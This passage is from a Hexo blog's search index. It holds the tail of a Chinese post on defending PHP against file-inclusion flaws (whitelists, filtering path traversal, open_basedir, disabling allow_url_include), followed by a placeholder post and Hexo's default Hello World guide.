pgsql"><span class="hljs-number">1.</span> 设置白名单<br>   代码在进行文件包含时，如果文件名可以确定，可以设置白名单对传入的参数进行比较。<br><span class="hljs-number">2.</span> 过滤危险字符<br>   由于<span class="hljs-keyword">Include</span>/Require可以对PHP <span class="hljs-keyword">Wrapper</span>形式的地址进行包含执行（需要配置php.ini)，在Linux环境中可以通过&quot;../../&quot;&quot;的形式进行目录绕过，所以需要判断文件名称是否为合法的PHP文件。<br>3. 设置文件目录<br>   PHP配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置目录的话，PHP仅仅在该目录内搜索文件。<br>4. 关闭危险配置(禁止远程文件包含)<br>   PHP配置中的allow_url_include选项如果打开，PHP会通过Include/Require进行远程文件包含，由于远程文件的不可信任性及不确定性，在开发中禁止打开此选项，PHP默认是关闭的。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test123</title>
    <link href="/2022/10/12/test123/"/>
    <url>/2022/10/12/test123/</url>
    
    <content type="html"><![CDATA[<p>112233</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/10/11/hello-world/"/>
    <url>/2022/10/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
